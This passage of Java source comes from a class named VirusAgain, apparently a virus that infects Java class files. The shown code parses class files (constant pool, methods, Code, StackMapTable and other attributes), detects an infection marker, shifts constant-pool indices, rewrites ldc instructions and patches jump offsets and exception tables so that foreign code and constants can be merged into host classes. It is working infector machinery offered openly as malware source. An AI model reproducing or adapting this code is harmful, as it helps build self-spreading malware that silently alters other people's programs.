	 * @param UTF8_lookup
	 * @return [The number of methods, the index of the first byte after the methods[] table]
	 * @throws IOException 
	 */
	private static int[] _____parseAndUpdateMethodsPool(final RandomAccessFile out, byte bytes[], int index,
			final int change_amount, HashMap<Integer, String> UTF8_lookup, HashSet<Integer> remove_name_indices) throws IOException {
		int methods_count = _____bytes2(bytes, index);
		index += 2;

		int new_methods_count = methods_count;
		for (int i = 0; i < methods_count; ++i) {
			final int method_start_index = index;

			//access_flags
			//int access_flags = 
			_____bytes2(bytes, index);
			//System.out.println("access_flags = " + access_flags);
			index += 2;

			//name_index
			int name_index = _____bytes2(bytes, index);
			--name_index;

			/*
			 * Check if this is a method we want to remove.
			 */
			boolean skipThisMethod = false;
			if (remove_name_indices != null && remove_name_indices.contains(name_index + 1)) {
				/*
				 * Remove this method (by skipping it).
				 */
				//System.out.println("Skipping method with name_index " + (name_index + 1));
				--new_methods_count;
				skipThisMethod = true;
			}

			//increase name_index
			//int new_name_index = 
			_____increase2Index(bytes, index, change_amount);
			//System.out.println("name_index " + name_index + "->" + new_name_index);
			index += 2;

			//descriptor_index
			//int descriptor_index = _____bytes2(bytes, index);
			//int new_descriptor_index =
			_____increase2Index(bytes, index, change_amount);
			index += 2;
			//System.out.println("descriptor_index " + descriptor_index + "->" + new_descriptor_index);

			/*
			 * Write out access_flags, name_index, descriptor_index.
			 */
			if (skipThisMethod == false && out != null) {
				out.write(bytes, method_start_index, 6);
			}

			//attributes_count
			final long attributes_count_fp;
			if (out != null) {
				attributes_count_fp = out.getFilePointer();
			}
			else {
				attributes_count_fp = 0;
			}
			int attributes_count = _____bytes2(bytes, index);
			index += 2;

			/*
			 * Write out attributes_count.
			 */
			if (skipThisMethod == false && out != null) {
				out.write(bytes, method_start_index + 6, 2);
			}
			//System.out.println("attributes_count = " + attributes_count);

			/*
			 * Modify the attributes[] of this method_info.
			 */
			RandomAccessFile tmp_out = out;
			if (skipThisMethod) {
				tmp_out = null;
			}
			int new_attributes_count = attributes_count;
			for (int j = 0; j < attributes_count; ++j) {
				index = _____updateAttribute(tmp_out, bytes,
						index, change_amount, UTF8_lookup, attributes_count_fp, null);
			}

			if (skipThisMethod == false) {
				/*
				 * Write out the new attributes_count.
				 */
				if (out != null) {
					final long fp = out.getFilePointer();
					//System.out.println(attributes_count_fp + " : " + fp);
					out.seek(attributes_count_fp);
					{
						byte tmp_bytes[] = _____intTo2Bytes(new_attributes_count);
						out.write(tmp_bytes);
					}
					out.seek(fp);
				}
			}
		}

		int retval[] = new int[2];
		retval[0] = new_methods_count;
		retval[1] = index;
		return retval;
	}

	/**
	 * 
	 * @param bytes
	 * @param index
	 * @param change_amount
	 * @param UTF8_lookup
	 * @return The index of the first byte after the attribute.
	 * @throws IOException 
	 */
	private static int _____updateAttribute(RandomAccessFile out, byte bytes[], int index, final int change_amount,
			HashMap<Integer, String> UTF8_lookup, final long attributes_count_fp, final Long parent_attribute_start_fp) throws IOException {
		final long attribute_start_fp;
		if (out != null) {
			attribute_start_fp = out.getFilePointer();
		} else {
			attribute_start_fp = 0;
		}
		final int old_index = index;

		//attribute_name_index
		int attributes_name_index = _____bytes2(bytes, index);

		//Get the attribute name
		String attribute_name;
		if (UTF8_lookup == null) {
			attribute_name = null;
		}
		else {
			attribute_name = UTF8_lookup.get(attributes_name_index);
		}

		/*
		 * Add change_amount to attribute_name_index.
		 */
		_____increase2Index(bytes, index, change_amount);
		index += 2;

		//Get attribute_length.
		final int attribute_length = _____bytes4(bytes, index);
		index += 4;
		final int end_index = (old_index + 6 + attribute_length);

		/*
		 * Write out
		 * u2	attribute_name_index
		 * u4	attribute_length
		 */
		if (out != null)
			out.write(bytes, old_index, 6);

		/*
		 * Skip processing if we don't need to do it.
		 * [NOTE: add || true in the if statement if you want to test just parsing]
		 */
		/*
		 * Deal with attributes_info and update any constant_pool references it may contain.
		 */
		if (attribute_name != null) {
			if (attribute_name.equals("Code")) {
				//System.out.println("attribute_info Code updated");

				//u2	max_stack
				//u2	max_locals
				if (out != null)
					out.write(bytes, index, 4);
				index += 4;

				//u4	code_length
				int code_length = _____bytes4(bytes, index);
				final long code_length_fp;
				if (out != null) {
					code_length_fp = out.getFilePointer();
					/*
					 * Add NUM_NOOPS to code length so we can prepend some noops to the code for use later.
					 */
					out.writeInt(code_length);
				}
				else {
					code_length_fp = 0;
				}
				index += 4;

				/*
				 * --------------------------------------------------
				 *  In other words, look through bytes[index] to bytes[index + code_length]
				 *  and increase any constant_pool references inside the code by change_amount.
				 *  This can be done using the function increase2Index(bytes, index, change_amount);.
				 */

				if (out != null) {
					/*
					 * Update and write out the code.
					 */
					int new_code_length = _____parseCode(out, bytes, index, code_length, change_amount);

					/*
					 * Write out the new code length.
					 */
					{
						//System.out.println(code_length + " -> " + new_code_length);
						final long fp = out.getFilePointer();
						out.seek(code_length_fp);
						out.writeInt(new_code_length);
						out.seek(fp);
					}
					/*
					 * Write out new attribute length.
					 */
					{
						final long fp = out.getFilePointer();
						out.seek(attribute_start_fp);
						out.skipBytes(2);//Skip 2 bytes in a way that doesn't make the code explode
						final int new_attribute_length = attribute_length - (code_length - new_code_length);
						out.writeInt(new_attribute_length);
						out.seek(fp);
					}
				}
				index += code_length;

				/*
				 * --------------------------------------------------
				 */

				/*
				 * Read and write out u2 exception_table_length 
				 */
				int exception_table_length = _____bytes2(bytes, index);
				if (out != null) {
					out.write(bytes, index, 2);
				}
				index += 2;

				for (int i = 0; i < exception_table_length; ++i) {
					if (out != null)
						out.write(bytes, index, 6);
					index += 6;

					//catch_type
					int catch_type = _____bytes2(bytes, index);
					if (catch_type != 0) {
						_____increase2Index(bytes, index, change_amount);
					}
					if (out != null)
						out.write(bytes, index, 2);
					index += 2;
				}

				if (PARSE_CODE_ATTRIBUTES) {
					/*
					 * Get and write out attributes_count.
					 */
					final long passed_attributes_count_fp;
					int attributes_count = _____bytes2(bytes, index);
					if (out != null) {
						passed_attributes_count_fp = out.getFilePointer();
						out.write(bytes, index, 2);
					} else {
						passed_attributes_count_fp = 0;
					}
					index += 2;

					/*
					 * Parse (and write out) the attributes.
					 */
					for (int i = 0; i < attributes_count; ++i) {
						index = _____updateAttribute(out, bytes, index, change_amount, UTF8_lookup,
								passed_attributes_count_fp, attribute_start_fp);
					}
				}
				else {
					/*
					 * How about we just remove all code attributes?
					 * Overwrite the previous attribute_length with one that doesn't include the attributes.
					 */
					{
						/*
						 * Write out an attribute_count of 0.
						 */
						if (out != null) {
							out.writeShort(0);
						}
						index += 2;

						if (out != null) {
							/*
							 * Calculate new attribute_length.
							 */
							int new_attribute_length = (int) (out.getFilePointer() - attribute_start_fp) - 6;

							/*
							 * Output new attribute_length.
							 */
							{
								final long fp = out.getFilePointer();
								out.seek(attribute_start_fp);
								out.skipBytes(2);//Skip 2 bytes in a way that doesn't make the code explode
								out.writeInt(new_attribute_length);
								out.seek(fp);
							}
						}
						index = end_index;
					}
				}

				if (index != end_index) {
					System.err.println("ERROR! index incorrect. index = " + index + ", expected = " + end_index);
				}
				return index;
			}
			else if (attribute_name.equals("ConstantValue")
					|| attribute_name.equals("SourceFile")) {
				//System.out.println("attribute_info ConstantValue or SourceFile updated");
				/*
				 * Increase constant_pool reference in a ConstantValue or SourceFile type attribute.
				 * 	i.e. constantvalue_index = constantvalue_index + constantvalue_index
				 */
				_____increase2Index(bytes, index, change_amount);
			}
			else if (attribute_name.equals("StackMapTable")) {
				if (STACK_MAP_TABLE_ACTION == STACK_MAP_TABLE_TRUNCATE) {
					/*
					 * Set the number of StackMapTable entries to 0.
					 */
					if (out != null) {
						/*
						 * Set attribute_length to one that doesn't include attributes.
						 */
						out.seek(out.getFilePointer());
						out.skipBytes(-4);
						final int my_attribute_length = 2;
						out.writeInt(my_attribute_length);

						/*
						 * Set number_of_entries to 0.
						 */
						out.write(0);

						/*
						 * Decrease the attribute_length of the parent attribute (if exists).
						 */
						{
							if (parent_attribute_start_fp != null) {
								/*
								 * Calculate new attribute_length.
								 */
								out.seek(parent_attribute_start_fp);
								out.skipBytes(2);//Skip 2 bytes in a way that doesn't make the code explode

								int parent_attribute_length = out.readInt();
								parent_attribute_length -= (my_attribute_length + 6);

								/*
								 * Output new attribute_length.
								 */
								out.seek(parent_attribute_start_fp);
								out.skipBytes(2);//Skip 2 bytes in a way that doesn't make the code explode

								out.writeInt(parent_attribute_length);
							}
						}
						//Set out to null so nothing else will be written out.
						out = null;
					}
				}
				else if (STACK_MAP_TABLE_ACTION == STACK_MAP_TABLE_REMOVE) {

					/*
					 * Decrement the attributes count then seek to the start of the attribute
					 *  (in effect, skip this attribute).
					 */
					if (out != null) {
						out.seek(attributes_count_fp);
						/*
						 * Decrement attributes_count.
						 */
						{
							byte tmp_in[] = new byte[2];
							tmp_in[0] = out.readByte();
							tmp_in[1] = out.readByte();

							int attributes_count = _____bytes2(tmp_in, 0);
							--attributes_count;

							byte tmp_out[] = _____intTo2Bytes(attributes_count);

							out.seek(attributes_count_fp);
							out.write(tmp_out);
						}

						/*
						 * Decrease the attribute_length of the parent attribute (if exists).
						 */
						{
							if (parent_attribute_start_fp != null) {
								/*
								 * Calculate new attribute_length.
								 */
								out.seek(parent_attribute_start_fp);
								out.skipBytes(2);//Skip 2 bytes in a way that doesn't make the code explode

								int parent_attribute_length = out.readInt();
								parent_attribute_length -= (attribute_length + 6);

								/*
								 * Output new attribute_length.
								 */
								out.seek(parent_attribute_start_fp);
								out.skipBytes(2);//Skip 2 bytes in a way that doesn't make the code explode

								out.writeInt(parent_attribute_length);
							}
						}

						/*
						 * Move to the start of the attribute so it will be overwritten.
						 */
						out.seek(attribute_start_fp);
						//Set out to null so nothing else will be written out.
						out = null;
					}
				}
				else if (STACK_MAP_TABLE_ACTION == STACK_MAP_TABLE_PARSE) {
					int number_of_entries = _____bytes2(bytes, index);
					//System.out.println("number_of_entries = " + number_of_entries);

					index += 2;

					for (; 0 < number_of_entries; --number_of_entries) {
						/*
						 * stack_map_frame
						 */
						{
							//int smf_tag = bytes[index];
							short smf_tag = (short) (0x00FF & ((short) bytes[index]));
							index += 1;

							/*
							 * union verification_type_info
							 */
							if (smf_tag <= 63) {
								//System.out.println("verification_type_info, smf_tag = " + smf_tag);//Print type for debugging purposes
								//_____update_verification_type_info(bytes, index - 1, change_amount);
								//index++;
							}

							/*
							 * same_locals_1_stack_item_frame
							 */
							if (64 <= smf_tag && smf_tag <= 127) {
								//System.out.println("same_locals_1_stack_item_frame, smf_tag = " + smf_tag);//Print type for debugging purposes
								index = _____update_verification_type_info(bytes, index, change_amount);
							}
							/*
							 * same_locals_1_stack_item_frame_extended
							 */
							else if (smf_tag == 247) {
								//System.out.println("same_locals_1_stack_item_frame_extended, smf_tag = " + smf_tag);//Print type for debugging purposes
								//_____increase2Index(bytes, index, change_amount);//Increase offset_delta
								index += 2;
								index = _____update_verification_type_info(bytes, index, change_amount);
							}
							/*
							 * chop_frame || same_frame_extended
							 */
							else if (248 <= smf_tag && smf_tag <= 251) {
								//_____increase2Index(bytes, index, change_amount);//Increase offset_delta
								index += 2;
							}
							/*
							 * append_frame
							 */
							else if (252 <= smf_tag && smf_tag <= 254) {
								//System.out.println("append_frame, smf_tag = " + smf_tag);//Print type for debugging purposes
								//_____increase2Index(bytes, index, change_amount);//Increase offset_delta
								index += 2;

								smf_tag -= 251;
								for (; 0 < smf_tag; --smf_tag) {
									index = _____update_verification_type_info(bytes, index, change_amount);
								}
							}
							/*
							 * full_frame
							 */
							else if (smf_tag == 255) {
								//System.out.println("full_frame, smf_tag = " + smf_tag);//Print type for debugging purposes
								index += 2;

								int number_of_locals = _____bytes2(bytes, index);
								index += 2;

								for (; 0 < number_of_locals; --number_of_locals) {
									index = _____update_verification_type_info(bytes, index, change_amount);
								}

								int number_of_stack_items = _____bytes2(bytes, index);
								index += 2;

								for (; 0 < number_of_stack_items; --number_of_stack_items) {
									index = _____update_verification_type_info(bytes, index, change_amount);
								}
							}
						}
					}
				}
			}
			else if (attribute_name.equals("Exceptions")) {
				//System.out.println("attribute_info Exceptions updated");
				int number_of_exceptions = _____bytes2(bytes, index);
				index += 2;

				for (int i = 0; i < number_of_exceptions; ++i) {
					_____increase2Index(bytes, index, change_amount);
					index += 2;
				}
			}
			else if (attribute_name.equals("BootstrapMethods")) {
				//System.out.println("attribute_info BootstrapMethods updated");
				int num_bootstrap_methods = _____bytes2(bytes, index);
				index += 2;

				for (int i = 0; i < num_bootstrap_methods; ++i) {
					_____increase2Index(bytes, index, change_amount);
					index += 2;

					int num_bootstrap_arguments = _____bytes2(bytes, index);
					index += 2;

					for (int j = 0; j < num_bootstrap_arguments; ++j) {
						_____increase2Index(bytes, index, change_amount);
						index += 2;
					}
				}
			}
			else if (attribute_name.equals("LocalVariableTable")) {
				//System.out.println("attribute_info LocalVariableTable updated");
				int local_variable_table_length = _____bytes2(bytes, index);
				index += 2;

				for (int i = 0; i < local_variable_table_length; ++i) {
					index += 4;

					_____increase2Index(bytes, index, change_amount);
					index += 2;

					_____increase2Index(bytes, index, change_amount);
					index += 4;
				}
			}
			else if (attribute_name.equals("LocalVariableTable")
					|| attribute_name.equals("LocalVariableTypeTable")) {
				//System.out.println("attribute_info LocalVariableTable updated");
				int local_variable_table_length = _____bytes2(bytes, index);
				index += 2;

				for (int i = 0; i < local_variable_table_length; ++i) {
					index += 4;

					_____increase2Index(bytes, index, change_amount);
					index += 2;

					_____increase2Index(bytes, index, change_amount);
					index += 4;
				}
			}
			else if (attribute_name.equals("InnerClasses")) {
				//System.out.println("attribute_info InnerClasses updated");
				int number_of_classes = _____bytes2(bytes, index);
				index += 2;

				for (int i = 0; i < number_of_classes; ++i) {
					_____increase2Index(bytes, index, change_amount);
					index += 2;

					_____increase2Index(bytes, index, change_amount);
					index += 2;

					_____increase2Index(bytes, index, change_amount);
					index += 4;
				}
			}
			else if (attribute_name.equals("MethodParameters")) {
				//System.out.println("attribute_info MethodParameters updated");
				int parameters_count = bytes[index];
				index += 1;

				for (int i = 0; i < parameters_count; ++i) {
					_____increase2Index(bytes, index, change_amount);
					index += 4;
				}
			}
			else if (attribute_name.equals("LineNumberTable")) {
				//System.out.println("attribute_info LineNumberTable updated");
				int line_number_table_length = _____bytes2(bytes, index);
				index += 2;
				index += 4 * line_number_table_length;
			}
			else if (attribute_name.equals("Signature")) {
				//System.out.println("attribute_info Signature updated");
				_____increase2Index(bytes, index, change_amount);
				index += 2;
			}
			else {
				//System.out.println("Not defined for " + attribute_name);
			}
		}
		else {
			System.err.println("Unknown attribute_name_index <" + attributes_name_index + ">, length = " + attribute_length + ".");
			index += attribute_length;
		}

		/*
		 * Write out the whole attribute.
		 */
		if (out != null) {
			out.write(bytes, old_index + 6, (int) attribute_length);
		}
		return end_index;
	}

	/**
	 * verification_type_info
	 * @param bytes
	 * @param index
	 * @param change_amount
	 */
	private static int _____update_verification_type_info(byte bytes[], int index, int change_amount) {
		short vti_tag = _____unsigned_byte(bytes[index]);
		index += 1;

		/* ITEM_Object */
		if (vti_tag == 7) {
			//int original_val = _____bytes2(bytes, index);
			/*int updated_val =*/_____increase2Index(bytes, index, change_amount);
			//System.out.println("\tindex = " + index + ", Original = " + original_val + ", new = " + updated_val);
			index += 2;
		}

		/* ITEM_Uninitialized */
		if (vti_tag == 8) {
			index += 2;
		}
		return index;
	}

	/**
	 * 
	 * @param data_bytes The data.
	 * @param byte_index Byte index of the constant_pool entry.
	 * @param change_amount The amount we want to add to every constant_pool reference.
	 * @return
	 */
	private static int _____increaseConstantPoolEntryRefs(byte data_bytes[], int byte_index, int change_amount) {
		int type = data_bytes[byte_index];
		++byte_index;

		switch (type) {
		case CONSTANT_Class:
		case CONSTANT_String:
		case CONSTANT_MethodType:
			_____increase2Index(data_bytes, byte_index, change_amount);
			byte_index += 2;
			break;
		case CONSTANT_Fieldref:
		case CONSTANT_Methodref:
		case CONSTANT_InterfaceMethodref:
		case CONSTANT_NameAndType:
			/*int name_index = */_____increase2Index(data_bytes, byte_index, change_amount);
			byte_index += 2;

			/*int descriptor_index = */_____increase2Index(data_bytes, byte_index, change_amount);
			byte_index += 2;
			break;
		case CONSTANT_MethodHandle:
			byte_index += 1;
			_____increase2Index(data_bytes, byte_index, change_amount);
			byte_index += 2;
			break;
		case CONSTANT_InvokeDynamic:
			byte_index += 2;
			_____increase2Index(data_bytes, byte_index, change_amount);
			byte_index += 2;
			break;
		/*
		 * Ones without updates.
		 */
		case CONSTANT_Utf8:
			int strlen = _____bytes2(data_bytes, byte_index);
			byte_index += 2 + strlen;
			break;
		case CONSTANT_Integer:
		case CONSTANT_Float:
			byte_index += 4;
			break;
		case CONSTANT_Long:
		case CONSTANT_Double:
			byte_index += 8;
			break;
		default:
			if (DEBUG_MESSAGES) {
				System.out.println("UNKNOWN constant_pool TAG TYPE = " + type);
			}
			break;
		}
		return byte_index;
	}

	private static int _____getChangeAmount(int start_index_value, int change_amount) {
		/*
		 * Is there a preexisting mapping that we should abide by?
		 *  i.e. swap out one value for another predefined one.
		 * Check for change_amount != 0 because that identifies the infected constant_pool.
		 */
		Integer switch_value = infected_switch_table.get(start_index_value);
		int index_value;
		if (change_amount != 0 && switch_value != null) {
			//Preexisting mapping.
			//System.out.println("Mapping abided [" + index_value + " -> " + switch_value + "]");
			index_value = switch_value;
		}
		else {
			//Just add change amount.
			index_value = start_index_value + change_amount;
		}
		return index_value;
	}

	private static int _____increase2Index(byte data_bytes[], int byte_index, int change_amount) {
		int start_index_value = _____bytes2(data_bytes, byte_index);
		int index_value = _____getChangeAmount(start_index_value, change_amount);

		byte bytes[] = _____intTo2Bytes(index_value);
		data_bytes[byte_index] = bytes[0];
		data_bytes[byte_index + 1] = bytes[1];
		return index_value;
	}

	/**
	 * 
	 * @return
	 * null if the file isn't a class file.
	 * 
	 * retval[][] otherwise,
	 * where retval[0] = {
	 * [-1, constant_pool_count, constant_pool_end, 0, main_index] if the file isn't infected.
	 * Where
	 * 		-1 == -1;
	 * 		constant_pool_count = The total number of constant_pool entries in this file (constant_pool_count - 1). 
	 *		constant_pool_end = Byte offset of the end of the constant_pool.
	 *		0
	 *		main_index = Byte offset of the main() function. -1 if doesn't exist.
	 *	
	 * [INFECTED_constant_pool_count, constant_pool_count, constant_pool_end, offset_of_INFECTION_IDENTIFIER, main_index]
	 * Where
	 *		INFECTED_constant_pool_count = Positive integer. Number constant_pool entries belonging to the infection.
	 *		constant_pool_count = The total number of constant_pool entries in this file (constant_pool_count - 1).
	 *		constant_pool_end = Byte offset of the end of the constant_pool.
	 *		offset_of_INFECTION_IDENTIFIER = The byte offset of INFECTION_IDENTIFIER entry in the constant_pool.
	 *		main_index = Byte offset of the String portion UTF8 belonging to the main() function. -1 if doesn't exist.
	 * }
	 * and retval[1] = An array of byte indices; one for each constant pool entry,
	 * 	 plus one entry for the first byte _after_ constant table.
	 * 
	 * @param constant_lookup	A hashmap of all UTF8's and their constant_pool indices.
	 * 							For use later when looking up special names such as "Code".
	 *
	 * @throws IOException 
	 */
	private static int[][] _____isFileInfected(byte bytes[], HashMap<Integer, String> UTF8_lookup) throws IOException {
		/*
		 * We first assume the file isn't infected.
		 */
		int indices[] = new int[5];
		indices[0] = -1;
		indices[3] = 0;
		indices[4] = -1;

		/*
		 * Get the constant_pool_count - 1.
		 */
		final int constant_pool_count = _____bytes2(bytes, 8) - 1;
		indices[1] = constant_pool_count;

		/*
		 * Initialise the constant_pool_offsets array.
		 */
		int constant_pool_offsets[] = new int[constant_pool_count + 1];
		constant_pool_offsets[0] = 10;

		for (int i = 0; i < constant_pool_offsets.length - 1; ++i) {
			int index = constant_pool_offsets[i];

			/*
			 * Get the index of the next constant_pool entry.
			 */
			constant_pool_offsets[i + 1] = _____increaseConstantPoolEntryRefs(bytes, index, 0);

			/*
			 * Check if this constant_pool entry is UTF8.
			 */
			String str = _____parseCONSTANT_Utf8(bytes, index);
			if (str != null) {
				/*
				 * Save the UTF8 in our lookup table.
				 */
				if (UTF8_lookup != null) {
					UTF8_lookup.put((i + 1), str);
				}

				/*
				 * Check if this UTF8 is the name of the main function.
				 * NOTE: This may not actually be the name of the main function, it could just be a String.
				 * There's seemingly no Methodref for main, so we can't really tell just by looking.
				 */
				if (str.equals("main")) {
					indices[4] = index + 3;
				}

				/*
				 * Check if this UTF8 is our INFECTION_IDENTIFIER.
				 */
				if (indices[3] == 0 && str.equals(INFECTION_IDENTIFIER)) {
					/*
					 * Note down the byte index of the INFECTION_IDENTIFIER.
					 */
					//indices[3] = constant_pool_offsets[i - 1];//We do this because the UTF8 is the SECOND entry, not the first
					indices[3] = constant_pool_offsets[i];

					//System.out.println("INFECTION_IDENTIFIER found at " + (i + 1));
					/*
					 * Note down the number of infected constant_pool entries.
					 */
					//indices[0] = constant_pool_count - i + 1;
					indices[0] = constant_pool_count - i;
					//System.out.println("INFECTED_constant_pool_count = " + indices[0]);
				}
			}
		}
		indices[2] = constant_pool_offsets[constant_pool_offsets.length - 1];

		/*
		 * Return
		 */
		return new int[][] { indices, constant_pool_offsets };
	}

	/*
	 * Constant entry stuff--------------------------------------------------
	 */

	/**
	 * Check if a constant_pool entry is UTF8.
	 * If it is return a String representation of it.
	 * @param bytes
	 * @param index Index of the start of the constant_pool entry.
	 * @return null if not UTF8. Else return a String representation of the UTF8.
	 */
	private static String _____parseCONSTANT_Utf8(byte bytes[], int index) {
		if (bytes[index] != CONSTANT_Utf8) {
			return null;
		}
		final int strlen = _____bytes2(bytes, index + 1);
		return _____parseCONSTANT_Utf8(bytes, index + 3, strlen);
	}

	/**
	 * 
	 * @param bytes
	 * @param index
	 * @param length
	 * @return
	 */
	private static String _____parseCONSTANT_Utf8(byte bytes[], int index, int length) {
		//<convert to str hopefully>
		int strIndex = index + length;
		char str[] = new char[length];
		for (--length, --strIndex; length >= 0; --length, --strIndex) {
			str[length] = (char) bytes[strIndex];
		}
		//</convert to str hopefully>
		return new String(str);
	}

	/*
	 * Bytes stuff--------------------------------------------------
	 */

	/**
	 * 
	 * @param theByte
	 * @return
	 */
	private static short _____unsigned_byte(byte theByte) {
		short retval = (short) (0x00FF & ((short) theByte));
		return retval;
	}

	/**
	 * Read 4 consecutive bytes from the array and treat it as an integer.
	 * @param array The byte array.
	 * @param index The index (in number of bytes) to start reading.
	 * @return
	 */
	private static int _____bytes4(byte array[], int index) {
		return (array[index] << (3 * 8) & 0xFF000000)
				| (array[index + 1] << (2 * 8) & 0x00FF0000)
				| (array[index + 2] << (1 * 8) & 0x0000FF00)
				| (array[index + 3] & 0x000000FF);
	}

	/**
	 * Read 2 consecutive bytes from the array and treat it as an integer.
	 * @param array The byte array.
	 * @param index The index (in number of bytes) to start reading.
	 * @return
	 */
	private static int _____bytes2(byte array[], int index) {
		return (array[index] << (1 * 8) & 0x0000FF00)
				| (array[index + 1] & 0x000000FF);
	}

	/**
	 * Converts an integer to an array of 2 bytes.
	 */
	private static byte[] _____intTo2Bytes(int val) {
		return _____intToBytes(val, 2);
	}

	private static byte[] _____intToBytes(int val, int num_bytes) {
		byte array[] = new byte[num_bytes];
		int i = 0;
		int j = array.length - 1;//Using i instead of j in the following code would change the endianness
		for (; i < array.length; ++i, --j) {
			array[i] = (byte) ((val >> j * 8) & 0xFF);
		}
		return array;
	}

	/*
	 * -----
	 * Code Parser stuff
	 */

	private static void _____fixExceptionTable(byte bytes[], final long code_start_fp, final int exceptionTable_index, ArrayList<Long> ldc_fps) throws IOException {
		int index = exceptionTable_index;

		int exception_table_length = _____bytes2(bytes, index);
		index += 2;

		/*
		 * Walk through exception_table and update any PCs the need updating.
		 */
		for (int i = 0; i < exception_table_length; ++i) {
			/*
			 * u2	start_pc;
			 * u2	end_pc;
			 * u2	handler_pc;
			 */
			for (int j = 0; j < 3; ++j) {
				/*
				 * Read PC in and calculate its new value.
				 */
				int pc = _____bytes2(bytes, index);
				int new_pc = pc;

				for (int k = 0; k < ldc_fps.size(); ++k) {
					long ldc_offset = (ldc_fps.get(k) - code_start_fp);
					if (ldc_offset < pc) {
						++new_pc;
					}
				}

				/*
				 * Write the new PC out.
				 */
				{
					byte tmp_bytes[] = _____intTo2Bytes(new_pc);
					bytes[index] = tmp_bytes[0];
					bytes[index + 1] = tmp_bytes[1];
				}
				index += 2;
			}

			/*
			 * u2	catch_type;
			 */
			index += 2;
		}
	}

	private static void _____add2byteOffsets(final RandomAccessFile out, ArrayList<Long> ldc_fps, ArrayList<SimpleEntry<Long, Short>> instructions_with_2byte_offsets) throws IOException {
		final long fp = out.getFilePointer();

		for (int i = 0; i < ldc_fps.size(); ++i) {
			long ldc_fp = ldc_fps.get(i);
			for (int j = 0; j < instructions_with_2byte_offsets.size(); ++j) {
				long instruction_fp;
				short instruction_offset;
				{
					SimpleEntry<Long, Short> instruction = instructions_with_2byte_offsets.get(j);
					instruction_fp = instruction.getKey();
					instruction_offset = instruction.getValue();
				}

				if (instruction_fp < ldc_fp && ldc_fp < ((long) instruction_fp + instruction_offset)) {
					//add 1 to the offset in the jmp;
					out.seek(instruction_fp);
					out.skipBytes(1);

					++instruction_offset;
					out.writeShort(instruction_offset);
				}
				else if (((long) instruction_fp + instruction_offset) <= ldc_fp && ldc_fp < instruction_fp) {
					//subtract 1 to the offset in the jmp;
					out.seek(instruction_fp);
					out.skipBytes(1);

					--instruction_offset;
					out.writeShort(instruction_offset);
				}
			}
		}

		out.seek(fp);
	}

	private static void _____add4byteOffsets(final RandomAccessFile out, ArrayList<Long> ldc_fps, ArrayList<SimpleEntry<Long, Integer>> instructions_with_4byte_offsets) throws IOException {
		final long fp = out.getFilePointer();

		for (int i = 0; i < ldc_fps.size(); ++i) {
			long ldc_fp = ldc_fps.get(i);
			for (int j = 0; j < instructions_with_4byte_offsets.size(); ++j) {
				long instruction_fp;
				long instruction_offset;
				{
					SimpleEntry<Long, Integer> instruction = instructions_with_4byte_offsets.get(j);
					instruction_fp = instruction.getKey();
					instruction_offset = instruction.getValue();
				}

				if (instruction_fp < ldc_fp && ldc_fp < (instruction_fp + instruction_offset)) {
					//add 1 to the offset in the jmp;
					out.seek(instruction_fp);

					++instruction_offset;
					out.writeInt((int) instruction_offset);
				}
				else if ((instruction_fp + instruction_offset) <= ldc_fp && ldc_fp < instruction_fp) {
					//subtract 1 to the offset in the jmp;
					out.seek(instruction_fp);

					--instruction_offset;
					out.writeInt((int) instruction_offset);
				}
			}
		}

		out.seek(fp);
	}

	/**
	 * Returns new code length.
	 * @param out
	 * @param bytes
	 * @param index
	 * @param code_length
	 * @param change_amount
	 * @return
	 * @throws IOException
	 */
	private static int _____parseCode(final RandomAccessFile out, byte bytes[], int index,
			final int code_length, final int change_amount) throws IOException {
		final long code_start_fp = out.getFilePointer();
		final int code_start_index = index;
		final int end_index = index + code_length;

		ArrayList<Long> ldc_fps = new ArrayList<Long>();
		ArrayList<SimpleEntry<Long, Short>> instructions_with_2byte_offsets = new ArrayList<SimpleEntry<Long, Short>>();
		ArrayList<SimpleEntry<Long, Integer>> instructions_with_4byte_offsets = new ArrayList<SimpleEntry<Long, Integer>>();

		/*
		 * Write out NUM_NOPS nops.
		 */
		/*for(int i = 0; i < VirusAgain.NUM_NOPS; ++i){
			ldc_fps.add(out.getFilePointer());
			out.writeByte(0);
		}*/

		for (; index < end_index;) {
			short opcode = _____unsigned_byte(bytes[index]);

			/*
			 * Write out the opcode.
			 */
			out.writeByte(bytes[index]);
			index += 1;

			/*
			 * Check if the instruction is a three-byte one with an offset.
			 */
			{
				switch (opcode) {
				case 0xa7:
				case 0xa5:
				case 0xa6:
				case 0x9f:
				case 0xa2:
				case 0xa3:
				case 0xa4:
				case 0xa1:
				case 0xa0:
				case 0x99:
				case 0x9c:
				case 0x9d:
				case 0x9e:
				case 0x9b:
				case 0x9a:
				case 0xc7:
				case 0xc6:
				case 0xa8:
					long key = out.getFilePointer() - 1;
					short val = (short) _____bytes2(bytes, index);

					SimpleEntry<Long, Short> entry = new SimpleEntry<Long, Short>(key, val);
					instructions_with_2byte_offsets.add(entry);
					break;
				}

				switch (opcode) {
				case 0xc8://goto_w
				case 0xc9://jsr_w
					long key = out.getFilePointer() - 1;
					int val = _____bytes4(bytes, index);

					SimpleEntry<Long, Integer> entry = new SimpleEntry<Long, Integer>(key, val);
					instructions_with_4byte_offsets.add(entry);
					break;
				}
			}

			/*if (lineNum == 0 && opcode == 0xb2) {
			marked = true;
			System.out.println("<codedump>");
			}
			System.out.println(lineNum + ", " + (index - code_start_index) + " = " + opcode);*/

			boolean beenParsed = false;

			/*
			 * Parse two-byte instruction.
			 */
			{
				switch (opcode) {
				case 0xbc:
				case 0x10:
				case 0x19:
				case 0x3a:
				case 0x18:
				case 0x39:
				case 0x17:
				case 0x38:
				case 0x15:
				case 0x36:
				case 0x16:
				case 0x37:
				case 0xa9:
					beenParsed = true;
					out.write(bytes, index, 1);
					index += 1;
					break;
				case 0x12:
					beenParsed = true;

					//ldc_offsets.add(code_start_index - index - 1);
					ldc_fps.add(out.getFilePointer() - 1);
					/*
					 * Replace this instruction, ldc, with the wide version, ldc_w.
					 * Then update its constant_pool index.
					 * Needs to be done because ldc constant_pool refs can (and do) overflow.
					 */
					//Overwrite the opcode.
					out.seek(out.getFilePointer() - 1);
					out.write(0x13);
					//Get new constant_pool index.
					short constant_pool_ref = _____unsigned_byte(bytes[index]);
					constant_pool_ref = (short) VirusAgain._____getChangeAmount(constant_pool_ref, change_amount);
					//Output it.
					out.writeShort(constant_pool_ref);

					index += 1;
					break;
				}
			}
			if (beenParsed) {
				continue;
			}

			/*
			 * Parse three-byte instruction.
			 */
			{
				switch (opcode) {
				case 0xa7:
				case 0xa5:
				case 0xa6:
				case 0x9f:
				case 0xa2:
				case 0xa3:
				case 0xa4:
				case 0xa1:
